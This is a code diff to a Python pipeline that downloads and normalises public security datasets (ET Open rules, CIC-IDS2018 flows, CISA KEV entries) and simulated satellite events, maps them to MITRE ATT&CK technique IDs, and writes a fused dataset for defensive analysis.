+        (28.6, 77.2), (55.75, 37.6), (1.3, 103.8), (-23.5, -46.6),
+    ]
+    records = []
+    for i in range(n):
+        scenario = pick_scenario(i)
+        lat, lon = random.choice(coord_pool)
+        records.append(make_record(
+            record_id=f"simsat-{i}",
+            source="satellite_feed:simulated",
+            scenario=scenario,
+            description=f"Simulated event: {random.choice(event_types)}",
+            confidence_hint="simulated",
+            lat=round(lat + random.uniform(-0.5, 0.5), 4),
+            lon=round(lon + random.uniform(-0.5, 0.5), 4),
+            raw_ref="synthetic",
+        ))
+    return records
 
-    print("[ARES Phase 1] Normalising to STIX 2.1 entities…")
-    normalizer = TelemetryNormalizer()
-    stix_entities = normalizer.normalize_batch(raw_alerts)
 
-    # Sort by canonical timestamp ascending so the replayer streams in time order
-    stix_entities.sort(key=lambda e: e.timestamp)
+def adapt_et_rules():
+    path = SOURCES["et_rules_scan"]["path"]
+    if not path.exists():
+        return []
+    records = []
+    with open(path, "r", errors="ignore") as f:
+        lines = [l for l in f if l.strip().startswith("alert")]
+    for i, line in enumerate(lines):
+        scenario = pick_scenario(i)
+        msg = line.split('msg:"')[1].split('"')[0] if 'msg:"' in line else ""
+        records.append(make_record(
+            record_id=f"etrule-{i}",
+            source="siem:et_rules",
+            scenario=scenario,
+            description=msg or "ET Open rule match",
+            confidence_hint="signature_match",
+            raw_ref=line.strip()[:200],
+        ))
+    return records
 
-    stix_dicts = [_stix_entity_to_dict(e) for e in stix_entities]
 
-    # Ensure output directory exists
-    out_dir = os.path.dirname(output_path)
-    if out_dir:
-        os.makedirs(out_dir, exist_ok=True)
+def adapt_cic_ids2018():
+    path = SOURCES["cic_ids2018"]["path"]
+    if not path.exists():
+        print("[skip] cic_ids2018: file not present, fetch via aws s3 cp first")
+        return []
+    df = pd.read_csv(path, nrows=2000, on_bad_lines="skip", engine="python")
+    label_col = next((c for c in df.columns if c.strip().lower() == "label"), None)
+    if label_col is None:
+        print("[warn] cic_ids2018: 'Label' column not found, check actual header")
+        return []
 
-    with open(output_path, "w", encoding="utf-8") as fh:
-        json.dump(stix_dicts, fh, indent=2, ensure_ascii=False)
+    label_to_technique = {
+        "FTP-BruteForce": ("T1110", "Brute Force"),
+        "SSH-Bruteforce": ("T1110", "Brute Force"),
+        "DoS attacks-Hulk": ("T1498", "Network Denial of Service"),
+        "DoS attacks-GoldenEye": ("T1498", "Network Denial of Service"),
+        "DDoS attacks-LOIC-HTTP": ("T1498", "Network Denial of Service"),
+        "Bot": ("T1583", "Acquire Infrastructure"),
+        "Infilteration": ("T1210", "Exploitation of Remote Services"),
+    }
 
-    print(f"[ARES Phase 1] ✓ {len(stix_dicts)} STIX 2.1 objects written → {output_path}")
-    print("[ARES Phase 1] Done. Phase 1 complete.")
+    records = []
+    attacks_only = df[df[label_col] != "Benign"].head(500)
+    for i, row in attacks_only.iterrows():
+        scenario = pick_scenario(i)
+        label = str(row[label_col]).strip()
+        tid, tname = label_to_technique.get(label, (None, None))
+        records.append(make_record(
+            record_id=f"cicids-{i}",
+            source="cyber_sensor:cic_ids2018",
+            scenario=scenario,
+            technique_id=tid,
+            technique_name=tname,
+            description=f"Network flow labeled '{label}'",
+            confidence_hint="flow_label",
+            raw_ref=label,
+        ))
+    return records
+
+
+def adapt_kev():
+    path = SOURCES["cisa_kev"]["path"]
+    if not path.exists():
+        return []
+    data = json.loads(path.read_text())
+    vulns = data.get("vulnerabilities", [])[:100]  # trim for demo size
+    records = []
+    for i, v in enumerate(vulns):
+        scenario = pick_scenario(i)
+        records.append(make_record(
+            record_id=f"kev-{v.get('cveID', i)}",
+            source="intel_report:cisa_kev",
+            scenario=scenario,
+            description=f"{v.get('cveID')}: {v.get('vulnerabilityName', '')}",
+            confidence_hint="known_exploited",
+            raw_ref=v.get("cveID", ""),
+        ))
+    return records
+
+
+def adapt_intel_pdfs():
+    """
+    Placeholder for manually-downloaded CISA/vendor advisory PDFs.
+    Drop PDFs into data/raw/intel_pdfs/ and list their headline technique
+    IDs + a one-line summary here (extracting structured text from PDFs
+    reliably needs a proper PDF-parsing step — out of scope for this
+    normalization pass, but the record shape is ready for it).
+    """
+    manual_entries = [
+        # (technique_id, technique_name, description, source_ref)
+        # Example — replace with what you actually pull from CISA advisories:
+        # ("T1071", "Application Layer Protocol",
+        #  "CISA AA24-xxx: C2 beaconing over HTTPS observed in campaign",
+        #  "CISA_AA24-xxx.pdf"),
+    ]
+    records = []
+    for i, (tid, tname, desc, ref) in enumerate(manual_entries):
+        scenario = pick_scenario(i)
+        records.append(make_record(
+            record_id=f"intelpdf-{i}",
+            source="intel_report:advisory_pdf",
+            scenario=scenario,
+            technique_id=tid,
+            technique_name=tname,
+            description=desc,
+            confidence_hint="intel_confirmed",
+            raw_ref=ref,
+        ))
+    return records
+
+
+# --------------------------------------------------------------------------
+# 5. Run everything, fuse, write out
+# --------------------------------------------------------------------------
+
+def main():
+    random.seed(42)  # reproducible demo runs
+
+    print("== Downloading sources ==")
+    for name, spec in SOURCES.items():
+        try:
+            download(name, spec)
+        except Exception as e:
+            print(f"[error] {name}: {e}")
+
+    print("\n== Normalizing ==")
+    all_records = []
+    all_records += adapt_evtx_metadata()
+    all_records += adapt_splunk_attack_data()
+    all_records += adapt_telemanom()
+    all_records += simulate_satellite_events(n=25)
+    all_records += adapt_et_rules()
+    all_records += adapt_cic_ids2018()
+    all_records += adapt_kev()
+    all_records += adapt_intel_pdfs()
+
+    print(f"Total normalized records: {len(all_records)}")
+
+    all_records.sort(key=lambda r: r["timestamp"])
+
+    df_out = pd.DataFrame(all_records, columns=FUSED_COLUMNS)
+    csv_path = OUT_DIR / "fused_dataset.csv"
+    json_path = OUT_DIR / "fused_dataset.json"
+    df_out.to_csv(csv_path, index=False)
+    df_out.to_json(json_path, orient="records", indent=2)
+
+    print(f"\nWrote {csv_path} and {json_path}")
+    print("\nRecords per scenario campaign:")
+    print(df_out["scenario_campaign_id"].value_counts())
+    print("\nRecords per source:")
+    print(df_out["source"].value_counts())
 
 
 if __name__ == "__main__":
-    run_phase1_batch()
+    main()
